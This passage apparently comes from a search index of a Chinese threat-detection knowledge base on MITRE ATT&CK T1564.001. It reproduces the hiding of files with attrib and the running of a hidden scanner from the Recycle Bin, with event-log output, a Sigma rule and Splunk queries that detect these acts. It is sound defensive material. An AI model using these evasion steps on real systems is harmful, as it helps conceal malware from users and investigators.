\u6587\u4ef6\u7684\u529f\u80fd\u3002\u5f53\u7528\u6237\u4f7f\u7528GUI\u6d4f\u89c8\u6587\u4ef6\u7cfb\u7edf\u6216\u5728\u547d\u4ee4\u884c\u4e0a\u4f7f\u7528\u5e38\u89c4\u547d\u4ee4\u65f6\uff0c\u8fd9\u4e9b\u6587\u4ef6\u4e0d\u4f1a\u663e\u793a\u3002\u7528\u6237\u5fc5\u987b\u901a\u8fc7\u4e00\u7cfb\u5217\u56fe\u5f62\u7528\u6237\u754c\u9762\uff08GUI\uff09\u63d0\u793a\u6216\u4f7f\u7528\u547d\u4ee4\u884c\u5f00\u5173\uff08\u5bf9\u4e8eWindows\u4e3adir /a\uff0c\u5bf9\u4e8eLinux\u548cmacOS\u4e3als \u2013a\uff09\u660e\u786e\u8981\u6c42\u663e\u793a\u9690\u85cf\u6587\u4ef6\u3002 \u5728Linux\u548cMac\u4e0a\uff0c\u7528\u6237\u53ea\u9700\u5c06\u201c.\u201d\u6807\u8bb0\u4e3a\u9690\u85cf\uff0c\u5373\u53ef\u5c06\u5176\u6807\u8bb0\u4e3a\u9690\u85cf\u3002\u4f5c\u4e3a\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u540d\u79f0\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4ee5\u201c.\u201d\u5f00\u5934\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u5728Finder\u5e94\u7528\u7a0b\u5e8f\u548c\u6807\u51c6\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8f\uff08\u5982\u201c ls\u201d\uff09\u4e2d\u4e0d\u4f1a\u9690\u85cf\u3002\u7528\u6237\u5fc5\u987b\u4e13\u95e8\u66f4\u6539\u8bbe\u7f6e\u624d\u80fd\u67e5\u770b\u8fd9\u4e9b\u6587\u4ef6\u3002 macOS\u4e0a\u7684\u6587\u4ef6\u4e5f\u53ef\u4ee5\u7528UF_HIDDEN\u6807\u5fd7\u6807\u8bb0\uff0c\u8fd9\u53ef\u4ee5\u9632\u6b62\u5728Finder.app\u4e2d\u770b\u5230\u5b83\u4eec\uff0c\u4f46\u4ecd\u7136\u5141\u8bb8\u5728Terminal.app \u4e2d\u770b\u5230\u5b83\u4eec\u3002\u5728Windows\u4e0a\uff0c\u7528\u6237\u53ef\u4ee5\u4f7f\u7528attrib.exe\u4e8c\u8fdb\u5236\u6587\u4ef6\u5c06\u7279\u5b9a\u6587\u4ef6\u6807\u8bb0\u4e3a\u9690\u85cf\u3002\u8bb8\u591a\u5e94\u7528\u7a0b\u5e8f\u90fd\u4f1a\u521b\u5efa\u8fd9\u4e9b\u9690\u85cf\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u6765\u5b58\u50a8\u4fe1\u606f\uff0c\u4ee5\u514d\u4f7f\u7528\u6237\u7684\u5de5\u4f5c\u7a7a\u95f4\u53d8\u5f97\u6df7\u4e71\u3002\u4f8b\u5982\uff0cSSH\u5b9e\u7528\u7a0b\u5e8f\u4f1a\u521b\u5efa\u4e00\u4e2a.ssh\u6587\u4ef6\u5939\uff0c\u8be5\u6587\u4ef6\u5939\u5904\u4e8e\u9690\u85cf\u72b6\u6001\uff0c\u5176\u4e2d\u5305\u542b\u7528\u6237\u7684\u5df2\u77e5\u4e3b\u673a\u548c\u5bc6\u94a5\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u6b64\u4f18\u52bf\u6765\u9690\u85cf\u7cfb\u7edf\u4e0a\u4efb\u4f55\u4f4d\u7f6e\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\uff0c\u5e76\u9003\u907f\u4e0d\u5305\u542b\u5bf9\u9690\u85cf\u6587\u4ef6\u7684\u8c03\u67e5\u7684\u5178\u578b\u7528\u6237\u6216\u7cfb\u7edf\u5206\u6790\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E5%8F%91%E7%8E%B0%E6%94%BB%E5%87%BB%E8%80%85%E5%9C%A8%E5%9B%9E%E6%94%B6%E7%AB%99%E4%B8%AD%E9%9A%90%E8%97%8F%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_1","text":"\u653b\u51fb\u8005\u8c03\u7528\u9690\u85cf\u5728\u56de\u6536\u7ad9\u4e2d\u7684\u6076\u610f\u7a0b\u5e8f\u3002$recycle.bin\u6587\u4ef6\u5939\u662f\u7cfb\u7edf\u91cd\u8981\u7684\u9690\u85cf\u6587\u4ef6\uff0c\u4e00\u822c\u5b58\u5728\u4e8e\u78c1\u76d8\u6839\u76ee\u5f55\u4e0b\u3002\u662f\u7cfb\u7edf\u201c\u56de\u6536\u7ad9\u201d\u5728\u6bcf\u4e00\u4e2a\u78c1\u76d8\u4e0a\u7684\u94fe\u63a5\u6587\u4ef6\u5939\uff0c\u7528\u4e8e\u4fdd\u5b58\u78c1\u76d8\u4e0a\u5220\u9664\u7684\u6587\u4ef6\u6216\u8005\u6587\u4ef6\u5939\u4fe1\u606f\uff0c\u6211\u4eec\u6062\u590d\u8bef\u5220\u9664\u5230\u56de\u6536\u7ad9\u4e2d\u7684\u6587\u4ef6\u6216\u8005\u6587\u4ef6\u5939\u65f6\u5927\u6709\u7528\u5904\u3002\u4e00\u822c\u6211\u4eec\u8bbe\u7f6e\u663e\u793a\u78c1\u76d8\u7684\u9690\u85cf\u6587\u4ef6\u540e\uff0c\u624d\u80fd\u770b\u5230\u5b83\u3002 Win Vista\u4ee5\u524dWindows\u7cfb\u7edf\uff0c\u8be5\u6587\u4ef6\u5939\u540d\u79f0\u4e3a\uff1aRecycle ;Win Vista(Win7/8)\u4ee5\u540e\u7cfb\u7edf\u4e00\u822c\u540d\u79f0\u4e3a$RECYCLE.BIN \u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E5%8F%91%E7%8E%B0%E6%94%BB%E5%87%BB%E8%80%85%E5%9C%A8%E5%9B%9E%E6%94%B6%E7%AB%99%E4%B8%AD%E9%9A%90%E8%97%8F%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_2","text":"windows\u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E5%8F%91%E7%8E%B0%E6%94%BB%E5%87%BB%E8%80%85%E5%9C%A8%E5%9B%9E%E6%94%B6%E7%AB%99%E4%B8%AD%E9%9A%90%E8%97%8F%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_3","text":"C:\\Windows\\system32>C:\\$Recycle.bin\\$R54R99P.exe nbtscan 1.0.35 - 2008-04-08 - http://www.unixwiz.net/tools/ usage: C:\\$Recycle.bin\\$R54R99P.exe [options] target [targets...] Targets are lists of IP addresses, DNS names, or address ranges. Ranges can be in /nbits notation (\"192.168.12.0/24\") or with a range in the last octet (\"192.168.12.64-97\") -V show Version information -f show Full NBT resource record responses (recommended) -H generate HTTP headers -v turn on more Verbose debugging -n No looking up inverse names of IP addresses responding -p <n> bind to UDP Port <n> (default=0) -m include MAC address in response (implied by '-f') -T <n> Timeout the no-responses in <n> seconds (default=2 secs) -w <n> Wait <n> msecs after each write (default=10 ms) -t <n> Try each address <n> tries (default=1) -1 Use Winsock 1 only -P generate results in perl hashref format","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E5%8F%91%E7%8E%B0%E6%94%BB%E5%87%BB%E8%80%85%E5%9C%A8%E5%9B%9E%E6%94%B6%E7%AB%99%E4%B8%AD%E9%9A%90%E8%97%8F%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_4","text":"windows \u5b89\u5168\u65e5\u5fd7 windows server 2016 \u5b89\u5168\u65e5\u5fd7\uff0c\u4e8b\u4ef6ID\uff1a4688 \u65e5\u5fd7\u540d\u79f0: Security \u6765\u6e90: Microsoft-Windows-Security-Auditing \u65e5\u671f: 2021/4/6 17:39:04 \u4e8b\u4ef6 ID: 4688 \u4efb\u52a1\u7c7b\u522b: \u8fdb\u7a0b\u521b\u5efa \u7ea7\u522b: \u4fe1\u606f \u5173\u952e\u5b57: \u5ba1\u6838\u6210\u529f \u7528\u6237: \u6682\u7f3a \u8ba1\u7b97\u673a: 12306BR0B4DD.361a.com \u63cf\u8ff0: \u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002 \u521b\u5efa\u8005\u4e3b\u9898: \u5b89\u5168 ID: 361A\\12306br0 \u5e10\u6237\u540d: 12306br0 \u5e10\u6237\u57df: 361A \u767b\u5f55 ID: 0x507C3 \u76ee\u6807\u4e3b\u9898: \u5b89\u5168 ID: NULL SID \u5e10\u6237\u540d: - \u5e10\u6237\u57df: - \u767b\u5f55 ID: 0x0 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x1224 \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\$Recycle.Bin\\$R54R99P.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1937 \u5f3a\u5236\u6027\u6807\u7b7e: Mandatory Label\\High Mandatory Level \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x15d8 \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe \u8fdb\u7a0b\u547d\u4ee4\u884c: C:\\$Recycle.bin\\$R54R99P.exe","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E5%8F%91%E7%8E%B0%E6%94%BB%E5%87%BB%E8%80%85%E5%9C%A8%E5%9B%9E%E6%94%B6%E7%AB%99%E4%B8%AD%E9%9A%90%E8%97%8F%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_5","text":"title: \u53d1\u73b0\u653b\u51fb\u8005\u5728\u56de\u6536\u7ad9\u4e2d\u9690\u85cf\u6076\u610f\u8f6f\u4ef6 description: \u68c0\u6d4b\u653b\u51fb\u8005\u6267\u884c\u9690\u85cf\u5728\u56de\u6536\u7ad9\u4e2d\u7684\u6076\u610f\u7a0b\u5e8f status: experimental references: - https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Execution/Malware_In_recyclebin.txt logsource: \u200b product: windows \u200b service: security detection: \u200b selection: \u200b EventID: 4688 #Windows \u5b89\u5168\u65e5\u5fd7\uff0c\u8fdb\u7a0b\u521b\u5efa ParentProcessName: - 'cmd.exe' - 'ftp.exe' - 'schtasks.exe' - 'powershell.exe' - 'rundll32.exe' - 'regsvr32.exe' - 'msiexec.exe' Commanline: '*Recycle*' \u200b condition: selection level: high","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E5%8F%91%E7%8E%B0%E6%94%BB%E5%87%BB%E8%80%85%E5%9C%A8%E5%9B%9E%E6%94%B6%E7%AB%99%E4%B8%AD%E9%9A%90%E8%97%8F%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_6","text":"\u57fa\u4e8ewindows\u5b89\u5168\u65e5\u5fd7\uff08\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\uff09\u6216\u8005Sysmon\u65e5\u5fd7\u53ef\u8fdb\u884c\u6709\u6548\u68c0\u6d4b\u3002","title":"\u5efa\u8bae"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E5%8F%91%E7%8E%B0%E6%94%BB%E5%87%BB%E8%80%85%E5%9C%A8%E5%9B%9E%E6%94%B6%E7%AB%99%E4%B8%AD%E9%9A%90%E8%97%8F%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_7","text":"MITRE-ATT&CK-T1564-001 https://attack.mitre.org/techniques/T1564/001/ windows10\u7cfb\u7edf$recycle.bin\u7684\u8be6\u7ec6\u5220\u9664\u65b9\u6cd5\u4ecb\u7ecd https://www.pconline.com.cn/win10/1102/11023668.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E9%9A%90%E8%97%8F%E7%9A%84%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/","text":"T1564-001-win-\u9690\u85cf\u7684\u6587\u4ef6\u548c\u76ee\u5f55 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u6587\u4ef6\u548c\u76ee\u5f55\u8bbe\u7f6e\u4e3a\u9690\u85cf\uff0c\u4ee5\u9003\u907f\u68c0\u6d4b\u673a\u5236\u3002\u4e3a\u4e86\u9632\u6b62\u666e\u901a\u7528\u6237\u610f\u5916\u66f4\u6539\u7cfb\u7edf\u4e0a\u7684\u7279\u6b8a\u6587\u4ef6\uff0c\u5927\u591a\u6570\u64cd\u4f5c\u7cfb\u7edf\u90fd\u5177\u6709\u201c\u9690\u85cf\u201d\u6587\u4ef6\u7684\u529f\u80fd\u3002\u5f53\u7528\u6237\u4f7f\u7528GUI\u6d4f\u89c8\u6587\u4ef6\u7cfb\u7edf\u6216\u5728\u547d\u4ee4\u884c\u4e0a\u4f7f\u7528\u5e38\u89c4\u547d\u4ee4\u65f6\uff0c\u8fd9\u4e9b\u6587\u4ef6\u4e0d\u4f1a\u663e\u793a\u3002\u7528\u6237\u5fc5\u987b\u901a\u8fc7\u4e00\u7cfb\u5217\u56fe\u5f62\u7528\u6237\u754c\u9762\uff08GUI\uff09\u63d0\u793a\u6216\u4f7f\u7528\u547d\u4ee4\u884c\u5f00\u5173\uff08\u5bf9\u4e8eWindows\u4e3adir /a\uff0c\u5bf9\u4e8eLinux\u548cmacOS\u4e3als \u2013a\uff09\u660e\u786e\u8981\u6c42\u663e\u793a\u9690\u85cf\u6587\u4ef6\u3002 \u5728Linux\u548cMac\u4e0a\uff0c\u7528\u6237\u53ea\u9700\u5c06\u201c.\u201d\u6807\u8bb0\u4e3a\u9690\u85cf\uff0c\u5373\u53ef\u5c06\u5176\u6807\u8bb0\u4e3a\u9690\u85cf\u3002\u4f5c\u4e3a\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u540d\u79f0\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4ee5\u201c.\u201d\u5f00\u5934\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u5728Finder\u5e94\u7528\u7a0b\u5e8f\u548c\u6807\u51c6\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8f\uff08\u5982\u201c ls\u201d\uff09\u4e2d\u4e0d\u4f1a\u9690\u85cf\u3002\u7528\u6237\u5fc5\u987b\u4e13\u95e8\u66f4\u6539\u8bbe\u7f6e\u624d\u80fd\u67e5\u770b\u8fd9\u4e9b\u6587\u4ef6\u3002 macOS\u4e0a\u7684\u6587\u4ef6\u4e5f\u53ef\u4ee5\u7528UF_HIDDEN\u6807\u5fd7\u6807\u8bb0\uff0c\u8fd9\u53ef\u4ee5\u9632\u6b62\u5728Finder.app\u4e2d\u770b\u5230\u5b83\u4eec\uff0c\u4f46\u4ecd\u7136\u5141\u8bb8\u5728Terminal.app \u4e2d\u770b\u5230\u5b83\u4eec\u3002\u5728Windows\u4e0a\uff0c\u7528\u6237\u53ef\u4ee5\u4f7f\u7528attrib.exe\u4e8c\u8fdb\u5236\u6587\u4ef6\u5c06\u7279\u5b9a\u6587\u4ef6\u6807\u8bb0\u4e3a\u9690\u85cf\u3002\u8bb8\u591a\u5e94\u7528\u7a0b\u5e8f\u90fd\u4f1a\u521b\u5efa\u8fd9\u4e9b\u9690\u85cf\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u6765\u5b58\u50a8\u4fe1\u606f\uff0c\u4ee5\u514d\u4f7f\u7528\u6237\u7684\u5de5\u4f5c\u7a7a\u95f4\u53d8\u5f97\u6df7\u4e71\u3002\u4f8b\u5982\uff0cSSH\u5b9e\u7528\u7a0b\u5e8f\u4f1a\u521b\u5efa\u4e00\u4e2a.ssh\u6587\u4ef6\u5939\uff0c\u8be5\u6587\u4ef6\u5939\u5904\u4e8e\u9690\u85cf\u72b6\u6001\uff0c\u5176\u4e2d\u5305\u542b\u7528\u6237\u7684\u5df2\u77e5\u4e3b\u673a\u548c\u5bc6\u94a5\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u6b64\u4f18\u52bf\u6765\u9690\u85cf\u7cfb\u7edf\u4e0a\u4efb\u4f55\u4f4d\u7f6e\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\uff0c\u5e76\u9003\u907f\u4e0d\u5305\u542b\u5bf9\u9690\u85cf\u6587\u4ef6\u7684\u8c03\u67e5\u7684\u5178\u578b\u7528\u6237\u6216\u7cfb\u7edf\u5206\u6790\u3002 \u6d4b\u8bd5\u6848\u4f8b Attrib.exe\u662f\u4f4d\u4e8eC\\Windows\\System32\u6587\u4ef6\u5939\u4e2d\u7684Windows\u64cd\u4f5c\u7cfb\u7edf\u6587\u4ef6\u3002\u5b83\u5141\u8bb8\u60a8\u663e\u793a\u6216\u66f4\u6539\u6587\u4ef6\u5c5e\u6027\u3002attrib\u547d\u4ee4\u7684\u529f\u80fd\u662f\u8bbe\u7f6e\uff0c\u66f4\u6539\u6216\u5220\u9664\u8fd9\u4e9b\u6587\u4ef6\u5c5e\u6027\u4f7f\u7528attrib\u547d\u4ee4\uff0c\u53ef\u4ee5\u4f7f\u6587\u4ef6\u4e3a\u53ea\u8bfb\uff0c\u5f52\u6863\uff0c\u7cfb\u7edf\u548c\u9690\u85cf\u3002 \u4ec0\u4e48\u662f\u6587\u4ef6\u5c5e\u6027\uff1f A\u6587\u4ef6\u5c5e\u6027\u662f\u4e0e\u8ba1\u7b97\u673a\u4e0a\u7684\u4efb\u4f55\u6587\u4ef6\u76f8\u5173\u8054\u7684\u5143\u6570\u636e\uff0c\u63cf\u8ff0\u6216\u8ddf\u8e2a\u6587\u4ef6\u521b\u5efa\u6216\u4fee\u6539\uff0c\u6587\u4ef6\u5927\u5c0f\uff0c\u6587\u4ef6\u6269\u5c55\u540d\u548c\u6587\u4ef6\u6743\u9650\u7b49\u4fe1\u606f\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows sysmon \u6d4b\u8bd5\u590d\u73b0 Attrib\u547d\u4ee4\uff0c\u53ef\u4ee5\u8ba9\u6587\u4ef6\u5939\u5f7b\u5e95\u7684\u9690\u85cf\u8d77\u6765\uff0c\u5c31\u7b97\u662f\u5728\u6587\u4ef6\u5939\u9009\u9879\u4e2d\u8bbe\u7f6e\u4e86\u663e\u793a\u9690\u85cf\u6587\u4ef6\u5939\uff0c\u4e5f\u65e0\u6cd5\u663e\u793a\u51fa\u6765\u7684\u3002\u53ea\u80fd\u901a\u8fc7\u8def\u5f84\u8bbf\u95ee\u7684\u65b9\u5f0f\u6253\u5f00\u6587\u4ef6\u5939\u3002 C:\\Users\\splaybow>help attrib \u663e\u793a\u6216\u66f4\u6539\u6587\u4ef6\u5c5e\u6027\u3002 ATTRIB [+R | -R] [+A | -A ] [+S | -S] [+H | -H] [+I | -I] [drive:][path][filename] [/S [/D] [/L]] + \u8bbe\u7f6e\u5c5e\u6027\u3002 - \u6e05\u9664\u5c5e\u6027\u3002 R \u53ea\u8bfb\u6587\u4ef6\u5c5e\u6027\u3002 A \u5b58\u6863\u6587\u4ef6\u5c5e\u6027\u3002 S \u7cfb\u7edf\u6587\u4ef6\u5c5e\u6027\u3002 H \u9690\u85cf\u6587\u4ef6\u5c5e\u6027\u3002 I \u65e0\u5185\u5bb9\u7d22\u5f15\u6587\u4ef6\u5c5e\u6027\u3002 [drive:][path][filename] \u6307\u5b9a attrib \u8981\u5904\u7406\u7684\u6587\u4ef6\u3002 /S \u5904\u7406\u5f53\u524d\u6587\u4ef6\u5939\u53ca\u5176\u6240\u6709\u5b50\u6587\u4ef6\u5939\u4e2d\u7684\u5339\u914d\u6587\u4ef6\u3002 /D \u4e5f\u5904\u7406\u6587\u4ef6\u5939\u3002 /L \u5904\u7406\u7b26\u53f7\u94fe\u63a5\u548c\u7b26\u53f7\u94fe\u63a5\u76ee\u6807\u7684\u5c5e\u6027\u3002 \u6d4b\u8bd5\u7559\u75d5 windows sysmon/security \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u76d1\u89c6\u6587\u4ef6\u7cfb\u7edf\u548cShell\u547d\u4ee4\uff0c\u4ee5\u67e5\u627e\u4ee5\u201c.\u201d\u5f00\u5934\u7684\u6587\u4ef6\u3002\u548cWindows\u547d\u4ee4\u884c\u4f7f\u7528attrib.exe\u6dfb\u52a0\u9690\u85cf\u5c5e\u6027\u3002 splunk\u89c4\u5219 index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d*\\\\attrib.exe\u201d CommandLine=\u201d*+s*\u201d) index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d*\\\\attrib.exe\u201d CommandLine=\u201d*+h*\u201d) \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1564-001 https://attack.mitre.org/techniques/T1564/001/ CMD\u4e2d\u4f7f\u7528attrib\u547d\u4ee4\u8bbe\u7f6e\u6587\u4ef6\u53ea\u8bfb\u3001\u9690\u85cf\u5c5e\u6027\u8be6\u89e3 https://blog.csdn.net/whatday/article/details/52752555","title":"T1564-001-win-\u9690\u85cf\u7684\u6587\u4ef6\u548c\u76ee\u5f55"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E9%9A%90%E8%97%8F%E7%9A%84%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#t1564-001-win-","text":"","title":"T1564-001-win-\u9690\u85cf\u7684\u6587\u4ef6\u548c\u76ee\u5f55"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E9%9A%90%E8%97%8F%E7%9A%84%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u6587\u4ef6\u548c\u76ee\u5f55\u8bbe\u7f6e\u4e3a\u9690\u85cf\uff0c\u4ee5\u9003\u907f\u68c0\u6d4b\u673a\u5236\u3002\u4e3a\u4e86\u9632\u6b62\u666e\u901a\u7528\u6237\u610f\u5916\u66f4\u6539\u7cfb\u7edf\u4e0a\u7684\u7279\u6b8a\u6587\u4ef6\uff0c\u5927\u591a\u6570\u64cd\u4f5c\u7cfb\u7edf\u90fd\u5177\u6709\u201c\u9690\u85cf\u201d\u6587\u4ef6\u7684\u529f\u80fd\u3002\u5f53\u7528\u6237\u4f7f\u7528GUI\u6d4f\u89c8\u6587\u4ef6\u7cfb\u7edf\u6216\u5728\u547d\u4ee4\u884c\u4e0a\u4f7f\u7528\u5e38\u89c4\u547d\u4ee4\u65f6\uff0c\u8fd9\u4e9b\u6587\u4ef6\u4e0d\u4f1a\u663e\u793a\u3002\u7528\u6237\u5fc5\u987b\u901a\u8fc7\u4e00\u7cfb\u5217\u56fe\u5f62\u7528\u6237\u754c\u9762\uff08GUI\uff09\u63d0\u793a\u6216\u4f7f\u7528\u547d\u4ee4\u884c\u5f00\u5173\uff08\u5bf9\u4e8eWindows\u4e3adir /a\uff0c\u5bf9\u4e8eLinux\u548cmacOS\u4e3als \u2013a\uff09\u660e\u786e\u8981\u6c42\u663e\u793a\u9690\u85cf\u6587\u4ef6\u3002 \u5728Linux\u548cMac\u4e0a\uff0c\u7528\u6237\u53ea\u9700\u5c06\u201c.\u201d\u6807\u8bb0\u4e3a\u9690\u85cf\uff0c\u5373\u53ef\u5c06\u5176\u6807\u8bb0\u4e3a\u9690\u85cf\u3002\u4f5c\u4e3a\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u540d\u79f0\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4ee5\u201c.\u201d\u5f00\u5934\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u5728Finder\u5e94\u7528\u7a0b\u5e8f\u548c\u6807\u51c6\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8f\uff08\u5982\u201c ls\u201d\uff09\u4e2d\u4e0d\u4f1a\u9690\u85cf\u3002\u7528\u6237\u5fc5\u987b\u4e13\u95e8\u66f4\u6539\u8bbe\u7f6e\u624d\u80fd\u67e5\u770b\u8fd9\u4e9b\u6587\u4ef6\u3002 macOS\u4e0a\u7684\u6587\u4ef6\u4e5f\u53ef\u4ee5\u7528UF_HIDDEN\u6807\u5fd7\u6807\u8bb0\uff0c\u8fd9\u53ef\u4ee5\u9632\u6b62\u5728Finder.app\u4e2d\u770b\u5230\u5b83\u4eec\uff0c\u4f46\u4ecd\u7136\u5141\u8bb8\u5728Terminal.app \u4e2d\u770b\u5230\u5b83\u4eec\u3002\u5728Windows\u4e0a\uff0c\u7528\u6237\u53ef\u4ee5\u4f7f\u7528attrib.exe\u4e8c\u8fdb\u5236\u6587\u4ef6\u5c06\u7279\u5b9a\u6587\u4ef6\u6807\u8bb0\u4e3a\u9690\u85cf\u3002\u8bb8\u591a\u5e94\u7528\u7a0b\u5e8f\u90fd\u4f1a\u521b\u5efa\u8fd9\u4e9b\u9690\u85cf\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u6765\u5b58\u50a8\u4fe1\u606f\uff0c\u4ee5\u514d\u4f7f\u7528\u6237\u7684\u5de5\u4f5c\u7a7a\u95f4\u53d8\u5f97\u6df7\u4e71\u3002\u4f8b\u5982\uff0cSSH\u5b9e\u7528\u7a0b\u5e8f\u4f1a\u521b\u5efa\u4e00\u4e2a.ssh\u6587\u4ef6\u5939\uff0c\u8be5\u6587\u4ef6\u5939\u5904\u4e8e\u9690\u85cf\u72b6\u6001\uff0c\u5176\u4e2d\u5305\u542b\u7528\u6237\u7684\u5df2\u77e5\u4e3b\u673a\u548c\u5bc6\u94a5\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u6b64\u4f18\u52bf\u6765\u9690\u85cf\u7cfb\u7edf\u4e0a\u4efb\u4f55\u4f4d\u7f6e\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\uff0c\u5e76\u9003\u907f\u4e0d\u5305\u542b\u5bf9\u9690\u85cf\u6587\u4ef6\u7684\u8c03\u67e5\u7684\u5178\u578b\u7528\u6237\u6216\u7cfb\u7edf\u5206\u6790\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E9%9A%90%E8%97%8F%E7%9A%84%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#_1","text":"Attrib.exe\u662f\u4f4d\u4e8eC\\Windows\\System32\u6587\u4ef6\u5939\u4e2d\u7684Windows\u64cd\u4f5c\u7cfb\u7edf\u6587\u4ef6\u3002\u5b83\u5141\u8bb8\u60a8\u663e\u793a\u6216\u66f4\u6539\u6587\u4ef6\u5c5e\u6027\u3002attrib\u547d\u4ee4\u7684\u529f\u80fd\u662f\u8bbe\u7f6e\uff0c\u66f4\u6539\u6216\u5220\u9664\u8fd9\u4e9b\u6587\u4ef6\u5c5e\u6027\u4f7f\u7528attrib\u547d\u4ee4\uff0c\u53ef\u4ee5\u4f7f\u6587\u4ef6\u4e3a\u53ea\u8bfb\uff0c\u5f52\u6863\uff0c\u7cfb\u7edf\u548c\u9690\u85cf\u3002 \u4ec0\u4e48\u662f\u6587\u4ef6\u5c5e\u6027\uff1f A\u6587\u4ef6\u5c5e\u6027\u662f\u4e0e\u8ba1\u7b97\u673a\u4e0a\u7684\u4efb\u4f55\u6587\u4ef6\u76f8\u5173\u8054\u7684\u5143\u6570\u636e\uff0c\u63cf\u8ff0\u6216\u8ddf\u8e2a\u6587\u4ef6\u521b\u5efa\u6216\u4fee\u6539\uff0c\u6587\u4ef6\u5927\u5c0f\uff0c\u6587\u4ef6\u6269\u5c55\u540d\u548c\u6587\u4ef6\u6743\u9650\u7b49\u4fe1\u606f\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E9%9A%90%E8%97%8F%E7%9A%84%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#_2","text":"windows 